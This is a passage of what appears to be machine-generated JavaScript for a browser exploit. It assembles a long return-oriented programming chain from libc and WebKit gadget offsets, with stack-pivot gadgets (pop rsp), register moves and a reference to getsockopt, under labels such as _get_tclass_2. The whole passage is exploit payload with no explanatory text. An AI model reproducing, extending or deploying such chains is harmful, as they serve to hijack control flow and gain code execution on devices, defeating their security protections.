libc_base+11,//nop
libc_base+430587,
libc_base+207036,
libc_base+768796,
libc_base+11,//nop
libc_base+430587,
libc_base+207036,
libc_base+768796,
libc_base+713278,
libc_base+430587,
libc_base+713278
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
libc_base+207036,
libc_base+768796,
webkit_base+4687784,
libc_base+430587,
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+768796,
libc_base+772328,
libc_base+430587,
libc_base+713278
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
libc_base+207036,
libc_base+768796,
libc_base+165442,
libc_base+430587,
libc_base+207036,
libc_base+768796,
webkit_base+1420514,//pop r8
libc_base+430587,
libc_base+207036,
libc_base+768796,
libc_base+489696,//pop rsp
libc_base+430587,
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([208,0]);// 0xd0
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967080,4294967295]);// -0xd8
set_gadgets([
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([200,0]);// 0xc8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967088,4294967295]);// -0xd0
set_gadgets([
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([192,0]);// 0xc0
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967096,4294967295]);// -0xc8
set_gadgets([
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([184,0]);// 0xb8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967104,4294967295]);// -0xc0
set_gadgets([
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([176,0]);// 0xb0
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967112,4294967295]);// -0xb8
set_gadgets([
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([168,0]);// 0xa8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967272,4294967295]);// -0x18
set_gadgets([
libc_base+207036,
libc_base+388400,//mov rax,rdi
libc_base+772328
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
webkit_base+5236215,//and rax,rcx
libc_base+772328,
getsockopt_addr,
webkit_base+2989859,//mov [rax],rcx
libc_base+713278
]);
db([4294967192,4294967295]);// -0x68
set_gadgets([
libc_base+207036,
libc_base+388400,//mov rax,rdi
libc_base+713278
]);
db([48,0]);
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
libc_base+207036,
libc_base+740138,//mov rax,r8
libc_base+430587,
libc_base+713278
]);
db([32,0]);// 0x20
set_gadgets([
libc_base+207036,
libc_base+388400,//mov rax,rdi
libc_base+713278
]);
db([24,0]);// 0x18
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([128,0]);// 0x80
set_gadgets([
libc_base+207036,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+178488,//L2678
webkit_base+4687784,
libc_base+489696 //pop rsp
]);
//L2678:
db([0,0]);
//_get_tclass_2:
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+178560,//L2680
webkit_base+4687784,
libc_base+740138,//mov rax,r8
webkit_base+1420514 //pop r8
]);
//L2680:
db([0,0]);
set_gadgets([
libc_base+430587,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+178624,//L2682
webkit_base+4687784,
libc_base+740138,//mov rax,r8
webkit_base+1420514 //pop r8
]);
//L2682:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L2683:
db([4294967288,4294967295]);// -0x8
set_gadget(libc_base+772328,);
//L2685:
db([4,0]);// 0x4
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+972324,//mov [rax],ecx
libc_base+713278,
ropchain+178768,//L2688
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L2686:
db([4294967288,4294967295]);// -0x8
set_gadget(libc_base+772328,);
//L2688:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+740138,//mov rax,r8
libc_base+713278,
ropchain+178872,//L2690
webkit_base+4687784,
libc_base+713278
]);
//L2689:
db([4294967292,4294967295]);// -0x4
set_gadget(libc_base+768796,);
//L2690:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796
]);
//L2691:
db([61,0]);// 0x3d
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796
]);
//L2692:
db([41,0]);// 0x29
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+179072,//L2695
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L2693:
db([16,0]);// 0x10
set_gadget(libc_base+772328,);
//L2695:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+179160,//L2697
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+179176,//L2698
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L2697:
db([0,0]);
set_gadget(libc_base+772328,);
//L2698:
db([0,0]);
set_gadgets([
libc_base+149873,//mov eax,[rdi]
libc_base+713278,
ropchain+179336,//L2700
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+179368,//L2702
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+179320,//L2699
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+179352,//L2701
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L2699:
db([0,0]);
set_gadget(libc_base+165442,);
//L2700:
db([0,0]);
set_gadget(libc_base+772328,);
//L2701:
db([0,0]);
set_gadget(libc_base+768796,);
//L2702:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+179464,//L2704
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+179448,//L2703
webkit_base+4687784,
libc_base+165442
]);
//L2703:
db([0,0]);
set_gadget(libc_base+768796,);
//L2704:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796,
//L2706:
ropchain+179568,//L2705
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+489696,//pop rsp
ropchain+181648,//L2707
//L2705:
libc_base+863109,//mov rax,rcx
libc_base+713278
]);
db([4294967256,4294967295]);// -0x28
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+179712,//L2709
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+179728,//L2710
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+179696,//L2708
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L2708:
db([0,0]);
set_gadget(libc_base+165442,);
//L2709:
db([0,0]);
set_gadget(libc_base+768796,);
//L2710:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+179856,//L2713
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+179888,//L2715
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+179872,//L2714
webkit_base+4687784,
libc_base+713278
]);
//L2712:
db([0,0]);
set_gadget(webkit_base+3789839,);//pop r11
//L2713:
db([0,0]);
set_gadget(libc_base+165442,);
//L2714:
db([0,0]);
set_gadget(libc_base+768796,);
//L2715:
db([0,0]);
set_gadgets([
webkit_base+11809960,//cmp rax,rsi ;sete al
libc_base+232261,//movzx eax,al
webkit_base+426067,//shl rax,3
libc_base+713278,
ropchain+180000,//L2716+8
libc_base+507828,//add rax,rsi
libc_base+145226,//mov rax,[rax]
libc_base+713278,
ropchain+179992,//L2716
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+489696 //pop rsp
]);
//L2716:
db([0,0]);
set_gadgets([
ropchain+180016,//L2716+24
ropchain+180480,//L2711
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+180088,//L2719
webkit_base+4687784,
libc_base+768796
]);
//L2717:
db([0,0]);
set_gadget(libc_base+165442,);
//L2718:
db([0,0]);
set_gadget(libc_base+772328,);
//L2719:
db([0,0]);
set_gadgets([
libc_base+149873,//mov eax,[rdi]
libc_base+713278,
ropchain+180248,//L2721
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+180280,//L2723
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+180232,//L2720
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+180264,//L2722
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L2720:
db([0,0]);
set_gadget(libc_base+165442,);
//L2721:
db([0,0]);
set_gadget(libc_base+772328,);
//L2722:
db([0,0]);
set_gadget(libc_base+768796,);
//L2723:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+180360,//L2724
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+180376,//L2725
webkit_base+4687784,
libc_base+165442
]);
//L2724:
db([0,0]);
set_gadget(libc_base+768796,);
//L2725:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+180472,//L2727
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+180456,//L2726
webkit_base+4687784,
libc_base+165442
]);
//L2726:
db([0,0]);
set_gadget(libc_base+768796,);
//L2727:
db([0,0]);
//L2711:
set_gadgets([
libc_base+713278,
ropchain+180536,//L2730
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L2728:
db([4294967292,4294967295]);// -0x4
set_gadget(libc_base+772328,);
//L2730:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+180624,//L2732
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+180640,//L2733
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L2732:
db([0,0]);
set_gadget(libc_base+772328,);
//L2733:
db([0,0]);
set_gadgets([
libc_base+149873,//mov eax,[rdi]
libc_base+713278,
ropchain+180800,//L2735
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+180832,//L2737
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+180784,//L2734
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+180816,//L2736
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L2734:
db([0,0]);
set_gadget(libc_base+165442,);
//L2735:
db([0,0]);
set_gadget(libc_base+772328,);
//L2736:
db([0,0]);
set_gadget(libc_base+768796,);
//L2737:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+180912,//L2738
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+180928,//L2739
webkit_base+4687784,
libc_base+165442
]);
//L2738:
db([0,0]);
set_gadget(libc_base+768796,);
//L2739:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+181056,//L2741
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+181072,//L2742
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278,
ropchain+181040,//L2740
webkit_base+4687784,
libc_base+165442
]);
//L2740:
db([0,0]);
set_gadget(libc_base+772328,);
//L2741:
db([0,0]);
set_gadget(libc_base+768796,);
//L2742:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+181176,//L2743
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+181192,//L2744
webkit_base+4687784,
webkit_base+1420514 //pop r8
]);
//L2743:
db([0,0]);
set_gadget(libc_base+768796,);
//L2744:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+181312,//L2745
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+181296,//L2746
webkit_base+4687784,
libc_base+768796
]);
//L2746:
db([0,0]);
set_gadget(libc_base+489696,);//pop rsp
//L2745:
db([0,0]);
set_gadgets([
libc_base+713278,
ropchain+181400,//L2748
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278,
ropchain+181384,//L2747
webkit_base+4687784,
libc_base+165442
]);
//L2747:
db([0,0]);
set_gadget(libc_base+768796,);
//L2748:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+181504,//L2749
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+181520,//L2750
webkit_base+4687784,
webkit_base+1420514 //pop r8
]);
//L2749:
db([0,0]);
set_gadget(libc_base+768796,);
//L2750:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+181640,//L2751
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+181624,//L2752
webkit_base+4687784,
libc_base+768796
]);
//L2752:
db([0,0]);
set_gadget(libc_base+489696,);//pop rsp
//L2751:
db([0,0]);
//L2707:
set_gadget(libc_base+713278,);
db([208,0]);// 0xd0
set_gadgets([
libc_base+207036,
libc_base+768796,
libc_base+165442,
libc_base+430587,
libc_base+713278
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
libc_base+207036,
libc_base+768796,
libc_base+713278,
libc_base+430587,
libc_base+207036,
libc_base+768796,
webkit_base+608613,//pop rdx
libc_base+430587,
libc_base+207036,
libc_base+768796,
libc_base+772328,
libc_base+430587,
libc_base+207036,
libc_base+768796,
webkit_base+1420514,//pop r8
libc_base+430587,
libc_base+207036,
libc_base+768796,
webkit_base+17972187,//pop r9
libc_base+430587,
libc_base+207036,
libc_base+768796,
libc_base+765305,
libc_base+430587,
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+768796,
libc_base+11,//nop
libc_base+430587,
libc_base+207036,
libc_base+768796,
libc_base+11,//nop
libc_base+430587,
libc_base+207036,
libc_base+768796,
libc_base+713278,
libc_base+430587,
libc_base+713278
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
libc_base+207036,
libc_base+768796,
webkit_base+4687784,
libc_base+430587,
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+768796,
libc_base+772328,
libc_base+430587,
libc_base+713278
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
libc_base+207036,
libc_base+768796,
libc_base+165442,
libc_base+430587,
libc_base+207036,
libc_base+768796,
webkit_base+1420514,//pop r8
libc_base+430587,
libc_base+207036,
libc_base+768796,
libc_base+489696,//pop rsp
libc_base+430587,
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([208,0]);// 0xd0
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967080,4294967295]);// -0xd8
set_gadgets([
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([200,0]);// 0xc8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967088,4294967295]);// -0xd0
set_gadgets([
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([192,0]);// 0xc0
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967096,4294967295]);// -0xc8
set_gadgets([
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([184,0]);// 0xb8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967104,4294967295]);// -0xc0
set_gadgets([
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([176,0]);// 0xb0
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967112,4294967295]);// -0xb8
set_gadgets([
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([168,0]);// 0xa8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967272,4294967295]);// -0x18
set_gadgets([
libc_base+207036,
libc_base+388400,//mov rax,rdi
libc_base+772328
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
webkit_base+5236215,//and rax,rcx
libc_base+772328,
getsockopt_addr,
webkit_base+2989859,//mov [rax],rcx
libc_base+713278
]);
db([4294967192,4294967295]);// -0x68
set_gadgets([
libc_base+207036,
libc_base+388400,//mov rax,rdi
libc_base+713278
]);
db([48,0]);
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
libc_base+207036,
libc_base+740138,//mov rax,r8
libc_base+430587,
libc_base+713278
]);
db([32,0]);// 0x20
set_gadgets([
libc_base+207036,
libc_base+388400,//mov rax,rdi
libc_base+713278
]);
db([24,0]);// 0x18
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([128,0]);// 0x80
set_gadgets([
libc_base+207036,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+182968,//L2753
webkit_base+4687784,
libc_base+489696 //pop rsp
]);
//L2753:
db([0,0]);
//_get_tclass_3:
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+183040,//L2755
webkit_base+4687784,
libc_base+740138,//mov rax,r8
webkit_base+1420514 //pop r8
]);
//L2755:
db([0,0]);
set_gadgets([
libc_base+430587,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+183104,//L2757
webkit_base+4687784,
libc_base+740138,//mov rax,r8
webkit_base+1420514 //pop r8
]);
//L2757:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L2758:
db([4294967288,4294967295]);// -0x8
set_gadget(libc_base+772328,);
//L2760:
db([4,0]);// 0x4
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+972324,//mov [rax],ecx
libc_base+713278,
ropchain+183248,//L2763
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L2761:
db([4294967288,4294967295]);// -0x8
set_gadget(libc_base+772328,);
//L2763:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+740138,//mov rax,r8
libc_base+713278,
ropchain+183352,//L2765
webkit_base+4687784,
libc_base+713278
]);
//L2764:
db([4294967292,4294967295]);// -0x4
set_gadget(libc_base+768796,);
//L2765:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796
]);
//L2766:
db([61,0]);// 0x3d
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796
]);
//L2767:
db([41,0]);// 0x29
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+183552,//L2770
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L2768:
db([16,0]);// 0x10
set_gadget(libc_base+772328,);
//L2770:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+183640,//L2772
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+183656,//L2773
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L2772:
db([0,0]);
set_gadget(libc_base+772328,);
//L2773:
db([0,0]);
set_gadgets([
libc_base+149873,//mov eax,[rdi]
libc_base+713278,
ropchain+183816,//L2775
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+183848,//L2777
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+183800,//L2774
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+183832,//L2776
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L2774:
db([0,0]);
set_gadget(libc_base+165442,);
//L2775:
db([0,0]);
set_gadget(libc_base+772328,);
//L2776:
db([0,0]);
set_gadget(libc_base+768796,);
//L2777:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+183944,//L2779
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+183928,//L2778
webkit_base+4687784,
libc_base+165442
]);
//L2778:
db([0,0]);
set_gadget(libc_base+768796,);
//L2779:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796,
//L2781:
ropchain+184048,//L2780
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+489696,//pop rsp
ropchain+186128,//L2782
//L2780:
libc_base+863109,//mov rax,rcx
libc_base+713278
]);
db([4294967256,4294967295]);// -0x28
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+184192,//L2784
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+184208,//L2785
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+184176,//L2783
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L2783:
db([0,0]);
set_gadget(libc_base+165442,);
//L2784:
db([0,0]);
set_gadget(libc_base+768796,);
//L2785:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+184336,//L2788
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+184368,//L2790
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+184352,//L2789
webkit_base+4687784,
libc_base+713278
]);
//L2787:
db([0,0]);
set_gadget(webkit_base+3789839,);//pop r11
//L2788:
db([0,0]);
set_gadget(libc_base+165442,);
//L2789:
db([0,0]);
set_gadget(libc_base+768796,);
//L2790:
db([0,0]);
set_gadgets([
webkit_base+11809960,//cmp rax,rsi ;sete al
libc_base+232261,//movzx eax,al
webkit_base+426067,//shl rax,3
libc_base+713278,
ropchain+184480,//L2791+8
libc_base+507828,//add rax,rsi
libc_base+145226,//mov rax,[rax]
libc_base+713278,
ropchain+184472,//L2791
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+489696 //pop rsp
]);
//L2791:
db([0,0]);
set_gadgets([
ropchain+184496,//L2791+24
ropchain+184960,//L2786
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+184568,//L2794
webkit_base+4687784,
libc_base+768796
]);
//L2792:
db([0,0]);
set_gadget(libc_base+165442,);
//L2793:
db([0,0]);
set_gadget(libc_base+772328,);
//L2794:
db([0,0]);
set_gadgets([
libc_base+149873,//mov eax,[rdi]
libc_base+713278,
ropchain+184728,//L2796
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+184760,//L2798
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+184712,//L2795
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+184744,//L2797
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L2795:
db([0,0]);
set_gadget(libc_base+165442,);
//L2796:
db([0,0]);
set_gadget(libc_base+772328,);
//L2797:
db([0,0]);
set_gadget(libc_base+768796,);
//L2798:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+184840,//L2799
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+184856,//L2800
webkit_base+4687784,
libc_base+165442
]);
//L2799:
db([0,0]);
set_gadget(libc_base+768796,);
//L2800:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+184952,//L2802
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+184936,//L2801
webkit_base+4687784,
libc_base+165442
]);
//L2801:
db([0,0]);
set_gadget(libc_base+768796,);
//L2802:
db([0,0]);
//L2786:
set_gadgets([
libc_base+713278,
ropchain+185016,//L2805
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L2803:
db([4294967292,4294967295]);// -0x4
set_gadget(libc_base+772328,);
//L2805:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+185104,//L2807
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+185120,//L2808
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L2807:
db([0,0]);
set_gadget(libc_base+772328,);
//L2808:
db([0,0]);
set_gadgets([
libc_base+149873,//mov eax,[rdi]
libc_base+713278,
ropchain+185280,//L2810
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+185312,//L2812
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+185264,//L2809
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+185296,//L2811
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L2809:
db([0,0]);
set_gadget(libc_base+165442,);
//L2810:
db([0,0]);
set_gadget(libc_base+772328,);
//L2811:
db([0,0]);
set_gadget(libc_base+768796,);
//L2812:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+185392,//L2813
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+185408,//L2814
webkit_base+4687784,
libc_base+165442
]);
//L2813:
db([0,0]);
set_gadget(libc_base+768796,);
//L2814:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+185536,//L2816
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+185552,//L2817
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278,
ropchain+185520,//L2815
webkit_base+4687784,
libc_base+165442
]);
//L2815:
db([0,0]);
set_gadget(libc_base+772328,);
//L2816:
db([0,0]);
set_gadget(libc_base+768796,);
//L2817:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+185656,//L2818
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+185672,//L2819
webkit_base+4687784,
webkit_base+1420514 //pop r8
]);
//L2818:
db([0,0]);
set_gadget(libc_base+768796,);
//L2819:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+185792,//L2820
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+185776,//L2821
webkit_base+4687784,
libc_base+768796
]);
//L2821:
db([0,0]);
set_gadget(libc_base+489696,);//pop rsp
//L2820:
db([0,0]);
set_gadgets([
libc_base+713278,
ropchain+185880,//L2823
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278,
ropchain+185864,//L2822
webkit_base+4687784,
libc_base+165442
]);
//L2822:
db([0,0]);
set_gadget(libc_base+768796,);
//L2823:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+185984,//L2824
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+186000,//L2825
webkit_base+4687784,
webkit_base+1420514 //pop r8
]);
//L2824:
db([0,0]);
set_gadget(libc_base+768796,);
//L2825:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
